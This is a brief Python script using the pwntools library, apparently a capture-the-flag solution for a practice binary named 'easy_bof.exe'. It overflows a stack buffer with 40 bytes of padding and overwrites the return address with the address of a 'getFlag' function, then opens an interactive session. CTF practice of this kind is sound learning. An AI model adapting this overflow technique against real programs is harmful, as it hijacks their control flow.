import pwn

p = pwn.process("./easy_bof.exe")
elf = pwn.ELF("./easy_bof.exe")

p.sendline(b"A"*(16+24)+pwn.p64(elf.symbols["getFlag"]))
p.interactive()
